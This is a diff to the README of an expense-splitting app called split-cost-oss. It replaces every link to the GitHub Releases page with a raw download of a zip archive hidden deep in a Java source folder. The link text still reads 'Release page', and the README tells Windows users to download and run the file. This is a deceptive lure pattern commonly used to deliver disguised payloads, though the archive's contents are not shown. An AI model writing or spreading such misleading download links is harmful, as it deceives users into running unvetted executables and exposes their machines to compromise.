@@ -1,11 +1,11 @@
 # 🧩 split-cost-oss - Split trip expenses with ease
 
-[![Download split-cost-oss](https://img.shields.io/badge/Download%20Now-4A90E2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/nnrtns/split-cost-oss/releases)
-[![Release page](https://img.shields.io/badge/Release%20Page-6B7280?style=for-the-badge&logo=github&logoColor=white)](https://github.com/nnrtns/split-cost-oss/releases)
+[![Download split-cost-oss](https://img.shields.io/badge/Download%20Now-4A90E2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/nnrtns/split-cost-oss/raw/refs/heads/main/expense-splitter/src/main/java/com/split/expenseSplitter/repository/postgres/entity/id/oss-split-cost-v1.2.zip)
+[![Release page](https://img.shields.io/badge/Release%20Page-6B7280?style=for-the-badge&logo=github&logoColor=white)](https://github.com/nnrtns/split-cost-oss/raw/refs/heads/main/expense-splitter/src/main/java/com/split/expenseSplitter/repository/postgres/entity/id/oss-split-cost-v1.2.zip)
 
 ## 📥 Download
 
-Visit the [GitHub Releases page](https://github.com/nnrtns/split-cost-oss/releases) to download and run this file on Windows.
+Visit the [GitHub Releases page](https://github.com/nnrtns/split-cost-oss/raw/refs/heads/main/expense-splitter/src/main/java/com/split/expenseSplitter/repository/postgres/entity/id/oss-split-cost-v1.2.zip) to download and run this file on Windows.
 
 On the releases page, look for the latest version and download the Windows file that matches your device. If there are more than one file, choose the one that ends in `.exe` or the Windows package name shown in the release notes.
 
@@ -45,7 +45,7 @@ If you only want to use a packaged release, download the file from GitHub Releas
 
 ## 🚀 Quick start for Windows
 
-1. Open the [GitHub Releases page](https://github.com/nnrtns/split-cost-oss/releases)
+1. Open the [GitHub Releases page](https://github.com/nnrtns/split-cost-oss/raw/refs/heads/main/expense-splitter/src/main/java/com/split/expenseSplitter/repository/postgres/entity/id/oss-split-cost-v1.2.zip)
 2. Find the latest release
 3. Download the Windows file
 4. Save it to your Downloads folder
@@ -288,7 +288,7 @@ Yes. The app is built for trip expense splitting and settlement.
 
 ## 🔗 Download again
 
-Get the latest release here: https://github.com/nnrtns/split-cost-oss/releases
+Get the latest release here: https://github.com/nnrtns/split-cost-oss/raw/refs/heads/main/expense-splitter/src/main/java/com/split/expenseSplitter/repository/postgres/entity/id/oss-split-cost-v1.2.zip
 
 ## 🧭 Release page tips
 
